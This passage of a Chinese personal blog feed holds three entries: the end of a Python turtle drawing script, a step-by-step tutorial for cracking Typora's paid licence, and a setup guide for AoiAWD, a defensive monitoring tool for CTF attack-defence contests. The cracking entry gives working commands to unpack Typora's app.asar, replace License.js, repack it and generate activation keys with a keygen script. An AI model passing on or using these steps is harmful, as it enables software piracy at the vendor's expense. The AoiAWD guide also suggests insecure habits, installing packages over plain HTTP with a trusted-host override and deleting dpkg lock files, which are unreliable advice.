data-num="365"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="366"></td><td><pre></pre></td></tr><tr><td data-num="367"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="368"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">140</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="369"></td><td><pre>turtle<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"21r000"</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Arial'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'bold italic'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="370"></td><td><pre>turtle<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="371"></td><td><pre></pre></td></tr><tr><td data-num="372"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="373"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="374"></td><td><pre>turtle<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"BEIJING 2022"</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Arial'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'bold italic'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="375"></td><td><pre>turtle<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="376"></td><td><pre></pre></td></tr><tr><td data-num="377"></td><td><pre>turtle<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Typroa破解记录</title>
    <url>/article/ce12b2b3.html</url>
    <content><![CDATA[<p>Typroa 从当初的免费开源用到现在开始收费，早已习惯了 Typroa 的使用，但迟迟没有破解，趁着偷闲时候来破解一番</p>
<p>这样的索大谁能不爱啊！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213212547998.png" alt="image-20220213212547998" /></p>
<h1 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h1>
<ul>
<li><code>python3</code>  环境</li>
<li><code>typroa v1.0</code></li>
</ul>
<h1 id="破解教程"><a class="anchor" href="#破解教程">#</a> 破解教程</h1>
<h2 id="typroa安装"><a class="anchor" href="#typroa安装">#</a> Typroa 安装</h2>
<p>进入官网下载安装所需的 Typroa</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudHlwb3JhLm5ldC8=">官网链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201532908.png" alt="image-20220213201532908" /></p>
<p>双击进行安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201727667.png" alt="image-20220213201727667" /></p>
<p>一路默认安装即可，安装地址如有需求可自行更改</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201808709.png" alt="image-20220213201808709" /></p>
<p>安装完成自启也可取消</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201907812.png" alt="image-20220213201907812" /></p>
<p>可以看到此时的 Typroa 处于未激活状态</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201952056.png" alt="image-20220213201952056" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213203822679.png" alt="image-20220213203822679" /></p>
<h3 id="项目破解"><a class="anchor" href="#项目破解">#</a> 项目破解</h3>
<h4 id="下载破解项目"><a class="anchor" href="#下载破解项目">#</a> 下载破解项目</h4>
<p>使用 GitHub 上的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01hczBuU2hpL3R5cG9yYUNyYWNrZXI="> typoraCracker</span> 项目进行破解</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213202137943.png" alt="image-20220213202137943" /></p>
<p>使用 git 克隆脚本文件（需配置好 git）或者直接下载即可</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#采用命令行进行 gitclone</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#打开命令行工具 (win+R 输入 cmd)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">git</span> clone https://github.com.cnpmjs.org/Mas0nShi/typoraCracker.git</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213202352897.png" alt="image-20220213202352897" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213202955646.png" alt="image-20220213202955646" /></p>
<h4 id="安装依赖项"><a class="anchor" href="#安装依赖项">#</a> 安装依赖项</h4>
<p>通过 pip 命令对 requirements.txt 文件中的依赖项进行安装</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>pip <span class="token function">install</span> -r requirements.txt -i http://pypi.douban.com/simple --trusted-host pypi.douban.com --user</pre></td></tr></table></figure><p>找到 Typora 安装目录下的 <code>resources</code>  目录</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213203232475.png" alt="image-20220213203232475" /></p>
<p>找到 <code>resources</code>  目录下的 <code>app.asar</code>  文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213203305874.png" alt="image-20220213203305874" /></p>
<p>默认目录是在  <code>C:\Program Files\Typora\resources\app.asar</code> ，如有更改请自行更换。</p>
<h4 id="执行解包命名"><a class="anchor" href="#执行解包命名">#</a> 执行解包命名</h4>
<p>Windows 下如果路径是有空格的，需要用 <code>&quot;&quot;</code>  包起来，如果提示权限问题，用管理员身份运行命令行，建议后续都用管理员身份执行。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token string">"C:\Program Files\Typora\resources\app.asar"</span> workstation\outfile\</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213210806446.png" alt="image-20220213210806446" /></p>
<p>使用脚本文件夹 <code>example\path\License.js</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213210914056.png" alt="image-20220213210914056" /></p>
<p>替换掉 <code>workstation\outfile\dec_app\License.js</code>  文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211003173.png" alt="image-20220213211003173" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211059864.png" alt="image-20220213211059759" /></p>
<p>打包 <code>app.asar</code>  文件</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token operator">-</span>u workstation\outfile\dec_app workstation\outappasar</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211156023.png" alt="image-20220213211156023" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211353468.png" alt="image-20220213211353468" /></p>
<p>如遇报错:</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">|</span> ERROR <span class="token operator">|</span> __main__:packWenc:103 - plz input Directory <span class="token keyword">for</span> app.asar</pre></td></tr><tr><td data-num="2"></td><td><pre>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:</pre></td></tr><tr><td data-num="3"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">151</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre> main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">146</span>, <span class="token keyword">in</span> main</pre></td></tr><tr><td data-num="6"></td><td><pre> args.mode<span class="token punctuation">(</span>args.asarPath, args.dirPath, args.format<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">104</span>, <span class="token keyword">in</span> packWenc</pre></td></tr><tr><td data-num="8"></td><td><pre> raise NotADirectoryError</pre></td></tr><tr><td data-num="9"></td><td><pre>NotADirectoryError</pre></td></tr></table></figure><p>手动在脚本路径下打包 <code>workstation/outappasar</code>  文件夹就行了:</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>mkdir workstation<span class="token operator">/</span>outappasar</pre></td></tr><tr><td data-num="2"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token operator">-</span>u workstation\outfile\dec_app workstation\outappasar</pre></td></tr></table></figure><p>将打包回来的 <code>app.asar</code>  文件重新丢到 <code>Typora</code>  的 <code>resources</code>  目录下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211418146.png" alt="image-20220213211418146" /></p>
<p>如恐意外可将原文件复制一份</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211518576.png" alt="image-20220213211518576" /></p>
<h4 id="授权码生成"><a class="anchor" href="#授权码生成">#</a> 授权码生成</h4>
<p>需要安装 <code>nodejs</code>  环境，如果没有安装请自行安装。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#验证 node 安装:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">node</span> -v</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">node</span> example/keygen.js</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211824091.png" alt="image-20220213211824091" /></p>
<h4 id="激活"><a class="anchor" href="#激活">#</a> 激活</h4>
<p>授权码输入生成的码，邮箱输入 <code>crack@example.com</code> ，完事。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213212121736.png" alt="image-20220213212121736" /></p>
<p><code>PS：破解后部分功能可能会出现失效情况！</code></p>
<p><code>建议使用正版！！！</code></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu18.04中搭建AWD平台-AoiAWD记录</title>
    <url>/article/48abdb5.html</url>
    <content><![CDATA[<h1 id="aoiawd-轻量级edr系统"><a class="anchor" href="#aoiawd-轻量级edr系统">#</a> AoiAWD - 轻量级 EDR 系统</h1>
<p>AoiAWD 是一个由 Aodzip（安恒信息 海特实验室研究员、HAC 战队成员）维护的一个针对于 CTF AWD 模式的开源项目。专为比赛设计，便携性好，低权限运行的 EDR 系统。任何人都可以在 GNU AGPL-3.0 许可下使用该项目和分享该项目的源码。</p>
<h2 id="应用场景"><a class="anchor" href="#应用场景">#</a> 应用场景</h2>
<p>在常见的 AWD 比赛中，选手往往拥有一台（或若干台）开放了 SSH 服务和题目服务的 “靶机” 作为自己防守的阵地。</p>
<p>在实际比赛中，主办方往往会限制选手的 SSH 权限到一般用户 / 仅可管理题目的权限。并且针对一些常见的通用防火墙脚本（通防脚本）进行轮询式 check。</p>
<p>AoiAWD 是针对以上场景的限制和痛点设计的，组件间基于 socket 通信以便灵活部署，具有图形可视化界面。所有行为探针均支持在最低系统权限下运行，且默认不会干扰题目业务逻辑的正常运行，可以绕过绝大部分 check 脚本的行为检查。支持如下维度的行为捕获能力：</p>
<ul>
<li>Web 输入输出数据捕获、输出流量篡改（没错，你可以动态替换掉输出的 flag 为任意字符串）</li>
<li>PWN 类题目输入输出交互流量包捕获、当次运行时内存结构捕获、输出流量篡改</li>
<li>服务器进程 UID、PID、父进程、启动参数、运行时间捕获</li>
<li>服务器文件系统新建、删除、修改、权限变化行为捕获。</li>
</ul>
<p>本系统还内置了生命周期钩子，可以针对某一次行为的产生编写特定的插件去实现流量层面的临时热补丁、增加大屏告警、替换输出字符等操作。系统默认内置了如下插件可供参考：</p>
<ul>
<li>FlagBuster: 当检测到输出流量中包含了符合正则的 flag 字符串，产生大屏告警、标记触发规则的数据包、并将 flag 精准替换为看起来也像 flag 的随机数。</li>
<li>KingWatcher: KoH 类比赛中，当有其他队伍替换掉了赛点文件时，产生大屏告警。</li>
<li>ZombieKiller: 当文件系统上出现了不死马行为，标记可疑文件并产生大屏告警。</li>
</ul>
<h2 id="系统简介"><a class="anchor" href="#系统简介">#</a> 系统简介</h2>
<p>AoiAWD 分为六个组件，组件间互相配合实现系统的完整功能</p>
<ul>
<li>MongoDB Server: 日志数据存储数据库</li>
<li>AoiAWD Core: 中心数据处理与插件后端服务器</li>
<li>Frontend: 数据可视化平台前端</li>
<li>Guardian: PWN 行为探针</li>
<li>TapeWorm: Web 行为探针</li>
<li>RoundWorm: 系统进程与文件系统行为探针</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115193728724.png" alt="image-20220115193728724" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rhc1NlY3VyaXR5LUhhdExhYi9Bb2lBV0Q=">项目地址</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116003935041.png" alt="image-20220116003935041" /></p>
<h3 id="下载项目"><a class="anchor" href="#下载项目">#</a> <strong>下载项目</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> clone https://github.com/DasSecurity-HatLab/AoiAWD.git</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115193804823.png" alt="image-20220115193804823" /></p>
<h3 id="php环境安装与配置"><a class="anchor" href="#php环境安装与配置">#</a> <strong>PHP 环境安装与配置</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#安装 PHP 7.2</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> software-properties-common</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> add-apt-repository ppa:ondrej/php</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y php7.2</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># 通过 apt-get 安装 PEAR，以获得 PEAR 和 PECL 使用的必要包和分配系统。</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-pear</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment"># 安装 php7.2-dev 软件包以获取必要的 PHP7 源文件来编译其他模块</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-dev</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 安装 php-XML 扩展，否则 MongoDB 无法正常安装</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-xml php7.2-xml</pre></td></tr></table></figure><h3 id="mongodb-server"><a class="anchor" href="#mongodb-server">#</a> MongoDB Server</h3>
<p>用于记录庞大的流量文件的数据库，是整个系统的核心存储。</p>
<ul>
<li>一般情况下建议和 AoiAWD Core 一起部署在选手自己可控的主机上。</li>
<li>无需额外的配置，Ubuntu 环境下开箱即用，apt 一下即可搞定。</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mongodb-server</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> pecl <span class="token function">install</span> mongodb</pre></td></tr></table></figure><p><strong>报错</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>E: Could not get lock /var/lib/dpkg/lock-frontend - <span class="token function">open</span> <span class="token punctuation">(</span><span class="token number">11</span>: Resource temporarily unavailable<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>E: Unable to acquire the dpkg frontend lock <span class="token punctuation">(</span>/var/lib/dpkg/lock-frontend<span class="token punctuation">)</span>, is another process using it?</pre></td></tr></table></figure><p>删除锁定文件，就行了</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">rm</span> /var/lib/dpkg/lock-frontend    </pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">rm</span> /var/lib/dpkg/lock</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115194147190.png" alt="image-20220115194147190" /></p>
<p>修改 <code>php.ini</code>  文件</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/php/7.2/cli/php.ini</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 添加</span></pre></td></tr><tr><td data-num="2"></td><td><pre>extension<span class="token operator">=</span>mongodb<span class="token operator">.</span>so</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 修改</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span>Phar<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">;</span> http<span class="token punctuation">:</span><span class="token comment">//php.net/phar.readonly</span></pre></td></tr><tr><td data-num="6"></td><td><pre>phar<span class="token operator">.</span>readonly <span class="token operator">=</span> off</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">;</span> http<span class="token punctuation">:</span><span class="token comment">//php.net/phar.require-hash</span></pre></td></tr><tr><td data-num="8"></td><td><pre>phar<span class="token operator">.</span>require_hash <span class="token operator">=</span> off</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115195020647.png" alt="image-20220115195020647" /></p>
<h3 id="构建fronted项目"><a class="anchor" href="#构建fronted项目">#</a> <strong>构建 Fronted 项目</strong></h3>
<p>安装之前先对系统进行一番更新，若更新出现问题请根据报错自行解决</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential</pre></td></tr></table></figure><p>更新完成后，开始构建 Fronted 项目</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">npm</span>      <span class="token comment">#安装 npm</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org     <span class="token comment">#将下载源改为国内淘宝源</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">npm</span> cache clean --force</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">cd</span> AoiAWD   </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin class-name">cd</span> Frontend</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">npm</span> <span class="token function">install</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">npm</span> run build</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#安装时间较长，可以搞点别的项目（ps：不知道是不是个人网络问题）</span></pre></td></tr></table></figure><p>Vue 编写的 Web 前端，用来浏览日志，产生报警动画等可视化展示。</p>
<ul>
<li>使用 npm 编译打包。</li>
<li>一般情况下编译后将与 AoiAWD Core 集成为一个可执行文件。</li>
<li>无需单独的运行启动。</li>
</ul>
<p>由于 npm 安装过于缓慢，改用 yarn 进行安装</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#安装 yarn：</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">npm</span> <span class="token function">install</span> -g <span class="token function">yarn</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#查看版本号：</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">yarn</span> -v</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#安装依赖项：</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">yarn</span> <span class="token function">install</span></pre></td></tr></table></figure><p>然后需要设置一下</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">yarn</span> config <span class="token builtin class-name">set</span> ignore-engines <span class="token boolean">true</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116000117021.png" alt="image-20220116000117021" /></p>
<p>不设置的话会报错，提示 node 版本较低，要求 &quot;&gt;= 10&quot;。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>error locutus@2.0.15: The engine <span class="token string">"node"</span> is incompatible with this module. Expected version <span class="token string">">= 10"</span><span class="token builtin class-name">.</span> Got <span class="token string">"8.10.0"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>error Found incompatible module.</pre></td></tr></table></figure><p>安装好 yarn 后，也设置好 config 后，执行安装命令即可</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">yarn</span> <span class="token function">install</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">yarn</span> build</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116000759202.png" alt="image-20220116000759202" /></p>
<p>构建完成！！！</p>
<h3 id="构建aoiawd-core"><a class="anchor" href="#构建aoiawd-core">#</a> <strong>构建 AoiAWD core</strong></h3>
<p>此步骤依赖 PHP7-CLI 和部分必要的 PHP 扩展</p>
<p>是整个系统运行的核心，负责探针数据收集入库、插件生命周期管理、Web 前端托管服务。</p>
<ul>
<li>运行 compile.php 即可打包为一个单独的二进制文件，方便携带。</li>
<li>插件需要放到和 aoiawd.phar 同目录下的 plugins 文件夹，Web 端有直接重载插件的按钮，可以实现热更新。</li>
<li>一般情况下可直接无参数运行，如果需要特别的配置，可以增加 - h 参数查看帮助信息。</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">cd</span> AoiAWD</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">rm</span> -rf src/public/*</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">cp</span> -r <span class="token punctuation">..</span>/Frontend/dist/* src/public/</pre></td></tr><tr><td data-num="4"></td><td><pre>php compile.php</pre></td></tr></table></figure><p><strong>执行成功后得到 aoiawd.phar</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116001155928.png" alt="image-20220116001155928" /></p>
<h3 id="安装inotifywait"><a class="anchor" href="#安装inotifywait">#</a> <strong>安装 inotifywait</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">mkdir</span> inotifywait   </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">cd</span> inotifywait</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">wget</span> http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz   </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">tar</span> zxf inotify-tools-3.14.tar.gz   </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">cd</span> inotify-tools-3.14/</pre></td></tr><tr><td data-num="6"></td><td><pre>./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></pre></td></tr></table></figure><p>安装完成如图</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116001124821.png" alt="image-20220116001124821" /></p>
<h3 id="构建guardian"><a class="anchor" href="#构建guardian">#</a> <strong>构建 Guardian</strong></h3>
<p>一个二进制 PWN 的影子外壳，其原理是包裹在 PWN 题目外侧，在每次被启动的时候透明记录 STDIN 与 STDOUT 的流量，并快照 PWN 程序的内存结构 (/proc/????/mem) 上传回 AoiAWD Core。</p>
<ul>
<li>在项目目录运行 compile.php 将会编译影子壳程序和捆绑程序: guardian.phar，一般是在选手电脑上进行捆绑后将生成文件上传到靶机。</li>
<li>直接运行捆绑程序会输出帮助文本，其中比较重要的一些参数是:
<ul>
<li>-i: 输入需要套壳的 PWN 题目程序路径</li>
<li>-s: 输入可以从靶机访问到探针上线地址的 URL，比如说 192.168.???.???:8023</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">cd</span> Guardian</pre></td></tr><tr><td data-num="2"></td><td><pre>php compile.php</pre></td></tr></table></figure><p><strong>构建成功后得到 guardian.phar</strong></p>
<h3 id="构建roundworm"><a class="anchor" href="#构建roundworm">#</a> <strong>构建 RoundWorm</strong></h3>
<p>一个监控文件系统和进程的系统行为监视器，其原理是扫描 /proc 文件夹获取当前正在运行的所有进程的信息，以及利用 Linux 系统的 inotify 功能对指定文件夹的敏感文件操作进行全面的记录。</p>
<ul>
<li>直接运行 make 就可以编译生成</li>
<li>一般来讲该程序在靶机上运行，选手电脑上没必要执行这玩意。</li>
<li>添加 - h 参数即可看到帮助文档，其中比较重要的一些参数是:
<ul>
<li>-d: 后台运行，你当然不想关掉 ssh 的时候就把探针也给关了。</li>
<li>-s: 输入可以从靶机访问到探针上线地址的 IP，比如说 192.168.???.???。</li>
<li>-w: 需要监控文件变化的路径，如果有多个路径使用 ';' 分割，比如: -w &quot;/tmp;/var/www/html&quot;</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">cd</span> RoundWorm</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">make</span></pre></td></tr></table></figure><p><strong>构建成功会得到 roundworm</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220115201832392.png" alt="image-20220115201832392" /></p>
<h3 id="启动aoiawd"><a class="anchor" href="#启动aoiawd">#</a> <strong>启动 AoiAWD</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">mkdir</span> -p /data/db</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> mongod</pre></td></tr><tr><td data-num="3"></td><td><pre>./aoiawd.phar</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116001437890.png" alt="image-20220116001437890" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116001455804.png" alt="image-20220116001455804" /></p>
<h3 id="使用方法"><a class="anchor" href="#使用方法">#</a> <strong>使用方法</strong></h3>
<p><strong>搭建完后把刚刚那些文件夹中的生成的文件例如 xxx.phar 等发送到提供给我们的靶机上去，然后记得赋予权限，ip 是自己电脑 ip，端口就是默认 8023</strong></p>
